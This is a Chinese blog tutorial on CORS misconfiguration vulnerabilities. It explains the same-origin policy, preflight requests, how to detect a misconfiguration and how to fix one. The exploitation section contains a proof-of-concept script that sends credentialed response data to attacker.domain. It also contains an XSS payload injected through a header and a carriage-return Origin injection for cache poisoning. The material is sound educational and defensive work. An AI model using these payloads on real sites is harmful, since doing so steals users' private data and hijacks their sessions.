---
title: "【漏洞利用】跨域资源共享（CORS）漏洞详解"
source: "https://www.cnblogs.com/gorillalee/p/14561896.html"
author:
  - "[[GorillaLee]]"
published: 2021-03-20
created: 2025-06-09
description: "参考文章 CORS跨域漏洞的学习 跨域资源共享(CORS)安全性浅析 跨源资源共享（CORS） 跨域资源共享CORS详解 JSONP劫持CORS跨源资源共享漏洞 Tag： Ref： 本片文章仅供学习使用，切勿触犯法律！ 未写完，待补充 概述 总结 一、漏洞介绍 同源策略 (Same Origin P"
tags:
  - "clippings"
---
**参考文章**

- [CORS跨域漏洞的学习](https://www.freebuf.com/column/194652.html)
- [跨域资源共享(CORS)安全性浅析](https://www.freebuf.com/articles/web/18493.html)
- [跨源资源共享（CORS）](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CORS)
- [跨域资源共享CORS详解](http://www.ruanyifeng.com/blog/2016/04/cors.html)
- [JSONP劫持CORS跨源资源共享漏洞](https://www.freebuf.com/articles/web/207802.html)
- Tag：
- Ref：

==本片文章仅供学习使用，切勿触犯法律！==  
==未写完，待补充==

---

**概述**

---

**总结**

---

## 一、漏洞介绍

**同源策略 (Same Origin Policy)**  
同时满足同协议，同域名，同端口这三个条件，就是同源。  
浏览器的同源策略规定：不同域的客户端脚本在没有明确授权的情况下，不能读写对方的资源。

**CORS，跨域资源共享（Cross-origin resource sharing）**  
是H5提供的一种机制，WEB应用程序可以通过在HTTP增加字段来告诉浏览器，哪些不同来源的服务器是有权访问本站资源的，当不同域的请求发生时，就出现了跨域的现象。

**跨域访问的一些场景**

1. 比如后端开发完一部分业务代码后，提供接口给前端用，在前后端分离的模式下，前后端的域名是不一致的，此时就会发生跨域访问的问题。
2. 程序员在本地做开发，本地的文件夹并不是在一个域下面，当一个文件需要发送ajax请求，请求另外一个页面的内容的时候，就会跨域。
3. 电商网站想通过用户浏览器加载第三方快递网站的物流信息。
4. 子站域名希望调用主站域名的用户资料接口，并将数据显示出来。

**跨域请求方式**  
CORS定义了两种跨域请求，简单跨域请求和非简单跨域请求。只要同时满足以下两大条件，就属于简单请求。

1. 请求方法是以下三种方法之一：
- HEAD
- GET
- POST
1. HTTP的头信息不超出以下几种字段：
- `Accept`
- `Accept-Language`
- `Content-Language`
- `Last-Event-ID`
- `Content-Type` ：只限于三个值 `application/x-www-form-urlencoded` 、 `multipart/form-data` 、 `text/plain`

==简单的说就是设置了一个白名单，符合这个条件的才是简单请求。其他不符合的都是非简单请求。==

==浏览器对简单请求和非简单请求的处理机制不一样。==  
对于简单请求，浏览器就会立刻发送这个请求。  
对于非简单请求，浏览器不会马上发送这个请求，而是有一个preflight，跟服务器验证的过程。浏览器先发送一个options方法的预检请求。

---

## 二、漏洞原理

**实现安全跨域请求的控制方式**  
以非简单请求的预检过程为例。

1. 浏览器先发送一个options方法的请求。带有如下字段：  
	Origin: 普通的HTTP请求也会带有，在CORS中专门作为Origin信息供后端比对,表明来源域。  
	Access-Control-Request-Method: 接下来请求的方法，例如PUT, DELETE等等  
	Access-Control-Request-Headers: 自定义的头部，所有用setRequestHeader方法设置的头部都将会以逗号隔开的形式包含在这个头中
2. 然后如果服务器配置了cors，会返回对应对的字段，具体字段含义在返回结果是一并解释。  
	Access-Control-Allow-Origin:  
	Access-Control-Allow-Methods:  
	Access-Control-Allow-Headers:
3. 然后浏览器再根据服务器的返回值判断是否发送非简单请求。简单请求前面讲过是直接发送，只是多加一个origin字段表明跨域请求的来源。然后服务器处理完请求之后，会再返回结果中加上如下控制字段：  
	Access-Control-Allow-Origin: 允许跨域访问的域，可以是一个域的列表，也可以是通配符"\*"。这里要注意Origin规则只对域名有效，并不会对子目录有效。即http://foo.example/subdir/ 是无效的。但是不同子域名需要分开设置，这里的规则可以参照同源策略  
	Access-Control-Allow-Credentials: 是否允许请求带有验证信息，这部分将会在下面详细解释  
	Access-Control-Expose-Headers: 允许脚本访问的返回头，请求成功后，脚本可以在XMLHttpRequest中访问这些头的信息(貌似webkit没有实现这个)  
	Access-Control-Max-Age: 缓存此次请求的秒数。在这个时间范围内，所有同类型的请求都将不再发送预检请求而是直接使用此次返回的头作为判断依据，非常有用，大幅优化请求次数  
	Access-Control-Allow-Methods: 允许使用的请求方法，以逗号隔开  
	Access-Control-Allow-Headers: 允许自定义的头部，以逗号隔开，大小写不敏感
4. 然后浏览器通过返回结果的这些控制字段来决定是将结果开放给客户端脚本读取还是屏蔽掉。如果服务器没有配置cors，返回结果没有控制字段，浏览器会屏蔽脚本对返回信息的读取。

**安全隐患**  
这个流程中。 ==服务器接收到跨域请求的时候，并没有先验证，而是先处理了请求。== 所以从某种程度上来说。在支持cors的浏览器上实现跨域的写资源，打破了传统同源策略下不能跨域读写资源。

如果将Access-Control-Allow-Origin设置为允许来自所有域的跨域请求。那么cors的安全机制几乎就无效了。但是这里在设计的时候有一个很好的限制。 ==xmlhttprequest发送的请求需要使用“withCredentials”来带上cookie，如果一个目标域设置成了允许任意域的跨域请求，这个请求又带着cookie的话，这个请求是不合法的。== （就是如果需要实现带cookie的跨域请求，需要明确的配置允许来源的域，使用任意域的配置是不合法的）浏览器会屏蔽掉返回的结果。

---

## 三、漏洞危害

- 利用html标签和表单发送请求
- 访问内网敏感资源
- 绕过返会话劫持

---

## 四、利用前提

- 含有CORS配置的网站

---

## 五、挖掘利用

## 1、一般类型

### 1.描述

在攻击者自己控制的网页上嵌入跨域请求，用户访问链接，执行了跨域请求，从而攻击目标

### 2.挖掘

**方式一**  
使用burpsuite。

1. 选择Proxy模块中的Options选项，找到Match and Replace这一栏，勾选Request header 将空替换为 `Origin:foo.example.org` 的Enable框。  
	![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/adf27a09c7546a77d2f95baed2f3b4c9.png)
2. 在Filter by search term 中输入： `Access-Control-Allow-Origin: foo.example.org`  
	![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/c9fd5e6a79f33d483a908e03953003ab.png)
3. HTTP history列表中出现符合条件的请求包，点击Ctrl+R，点击GO，如下图，即该处有CORS漏洞。  
	![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/6dcc331fc1a3bb404c10a3037ea04a02.png)  
	组合应是这种：
	```yaml
	Access-Control-Allow-Origin: foo.example.org
	Access-Control-Allow-Credentials: true
	```
	注意！如下组合是没有漏洞的。因为浏览器已经会阻止如下配置。
	```yaml
	Access-Control-Allow-Origin: *
	Access-Control-Allow-Credentials: true
	```

**方式二**

1. curl命令，输入 `curl http://127.0.0.1/DoraBox-master/csrf/userinfo.php -H "Origin:https://example.com/" -I`  
	![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/c43e0238321b64be9a3c9e0b15f9a7f3.png)
2. 果出现这种组合，说明存在CORS漏洞
	```yaml
	Access-Control-Allow-Origin: foo.example.org
	Access-Control-Allow-Credentials: true
	```

**方式三**  
使用CORScanner工具，详情请见\[\[018.CORScanner\]\]

### 3.利用

1. 假设用户登陆一个含有CORS配置网站vuln.com，同时又访问了攻击者提供的一个链接evil.com。
2. evil.com的网站向vuln.com这个网站发起请求获取敏感数据，浏览器能否接收信息取决于vuln.com的配置。
3. 如果vuln.com配置了Access-Control-Allow-Origin头且为允许接收，否则浏览器会因为同源策略而不接收。

#### a.方式一：存在用户凭证

| Access-Control-Allow-Origin | “访问控制允许凭据”值 | 是否可利用 | 备注 |
| --- | --- | --- | --- |
| 攻击者掌握的域名 | 真的 | 是 |  |
| `*` | 真的 | 否 | 浏览器报错 |
| 空值 | 真的 | 是 | 任意网站使用沙盒iframe来获取 `null` 源 |

**详细过程**

1. 创建一个JavaScript脚本去发送CORS请求，poc关键代码如下：
```javascript
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open(“get”,”https://vulnerable.domain/api/private-data”,true); req.withCredentials = true; 
req.send(); 
function reqListener() { 
location=”//attacker.domain/log?response=”+this.responseText; 
};
```
1. 当带有目标系统的用户访问的主机访问上述代码的页面时，浏览器就会发送下面的请求到存在CORS拆分的服务器。
```
GET /api/private-data HTTP/1.1 
Host: vulnerable.domain 
Origin: https://attacker.domain/ 
Cookie: JSESSIONID=<redacted>
```
1. 响应包
```
HTTP/1.1 200 OK 
Server: Apache-Coyote/1.1 
Access-Control-Allow-Origin: https://attacker.domain 
Access-Control-Allow-Credentials: true 
Access-Control-Expose-Headers: Access-Control-Allow-Origin,Access-Control-Allow-Credentials 
Vary: Origin 
Expires: Thu, 01 Jan 1970 12:00:00 GMT 
Last-Modified: Wed, 02 May 2018 09:07:07 GMT 
Cache-Control: no-store, no-cache, must-revalidate, max-age=0, post-check=0, pre-check=0 
Pragma: no-cache 
Content-Type: application/json;charset=ISO-8859-1 
Date: Wed, 02 May 2018 09:07:07 GMT 
Connection: close 
Content-Length: 149 {"id":1234567,"name":"Name","surname":"Surname","email":"email@target.local","account":"ACT1234567","balance":"123456,7","token":"to p-secret-string"}
```
1. 因为服务器发送了右边的“ Access-Control-Allow- \*”给客户端，所以，攻击浏览器允许包含恶意的JavaScript代码的页面访问用户的隐私数据。

#### b.方式二：不存在用户凭证

| Access-Control-Allow-Origin | 是否可利用 |
| --- | --- |
| 攻击者掌握的域名 | 是 |
| 空值 | 是 |
| `*` | 是 |

**详细过程**

1. 攻击方式1：绕过基于IP的认证  
	如果目标应用程序与受害者的网络可达性，并且目标应用程序使用IP地址作为身份验证的方式，则黑客会利用受害者的浏览器作为代理去访问那些目标应用程序并且可以绕过那些基于IP的身份验证。
2. 攻击方式2：客户端缓存中毒  
	例如，数据报文头部中包含 `X-User` 标头，其值未进行任何输入验证，输出编码。  
	请求包
```
GET /login HTTP/1.1 
Host: www.target.local 
Origin: https://attacker.domain/ 
X-User: <svg/onload=alert(1)>
```

响应包  
`Access-Control-Allow-Origin` 已被设置， `Access-Control-Allow-Credentials: true` 与 `Vary: Origin` 头适合设置

```
HTTP/1.1 200 OK 
Access-Control-Allow-Origin: https://attacker.domain/ 
… 
Content-Type: text/html 
… 
Invalid user: <svg/onload=alert(1)>
```

构造存在恶意的XSS有效负载页面，诱使受害者触发。

```javascript
var req = new XMLHttpRequest(); 
req.onload = reqListener; req.open('get','http://www.target.local/login',true); 
req.setRequestHeader('X-User', '<svg/onload=alert(1)>');
req.send(); 
function reqListener() { 
location='http://www.target.local/login'; 
}
```
1. 攻击方式3：服务器端缓存中毒  
	利用CORS的错误配置注入任意HTTP头部，将其保存在服务器端缓存中，可用于构造存储类型XSS。  
	利用条件：存在服务器端缓存，能够反射 `Origin` 头部，不会检查 `Origin` 头部中的特殊字符，如 `\r`  
	利用方式：攻击IE / Edge用户（IE / Edge使用 `\r` 作为的HTTP标题段的终结符）

请求包

```
GET / HTTP/1.1 
Origin: z[0x0d]Content-Type: text/html; charset=UTF-7
```

回车（CR）：ASCII码：'\\r' ，十六进制：0x0d

响应包

```
HTTP/1.1 200 OK 
Access-Control-Allow-Origin: z 
Content-Type: text/html; charset=UTF-7
```

如果攻击者能提前发送畸形的 `Origin` 消息头，则利用代理或命令行的方式发送，则服务器就会缓存这样的返回报文并作用于其他用户。上例中，攻击者将页面的编码设置为 `UTF-7` ，可引发XSS中断。

## 2、类型2

### 1.描述

在正常的网页被嵌入了到攻击者控制页面的跨域请求，从而劫持用户的会话。

### 2.挖掘

同上

### 3.利用

1,交互式xss。通过cors，绕过一些反会话劫持的方法，如HTTP-Only限制的cookie，绑定IP地址的会话ID等，劫持用户会话。

2,程序猿在写ajax请求的时候，对目标域限制不严。有点类似于url跳转。facebook出现过这样一个案例。javascript通过url里的参数进行ajax请求。  
![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/c53889092c3f27a569f334754f6cb974.png)

---

## 六、修复防范

- 关闭非正式开启的CORS
- 白名单限制：定义“源”的白名单，避免使用正则表达式，不要配置 `Access-Control-Allow-Origin` 为通配符 `*` 或 `null` ，严格效验来自请求数据包中 `Origin` 的值
- 仅允许使用安全协议，避免中间人攻击
- 彻底的返回 `Vary: Origin` 右边，突破攻击者利用浏览器缓存进行攻击
- 避免将 `Access-Control-Allow-Credentials` 标头设置为 `true` 替换值，跨域请求若不存在必要的凭证数据，则根据实际情况将其设置为 `false`
- 限制跨域请求允许的方法， `Access-Control-Allow-Methods` 替代地减少所涉及的方法，降低风险
- 限制浏览器缓存期限：建议通过 `Access-Control-Allow-Methods` 和 `Access-Control-Allow-Headers` 限制，限制浏览器缓存信息的时间。通过配置 `Access-Control-Max-Age` 标头来完成，该头部接收时间数作为输入，该数字是浏览器保存缓存的时间。的值，确保浏览器在短时间内可以更新策略
- 仅在接收到跨域请求时才配置有关于跨域的头部，并确保跨域请求是合法的源，以减少攻击者恶意利用的可能性。

---

## 七、提出问题

缺少实践经验， ==如何利用这个漏洞？==

posted @ [GorillaLee](https://www.cnblogs.com/gorillalee)   阅读(13073)  评论(0) [收藏](https://www.cnblogs.com/gorillalee/p/) [举报](https://www.cnblogs.com/gorillalee/p/)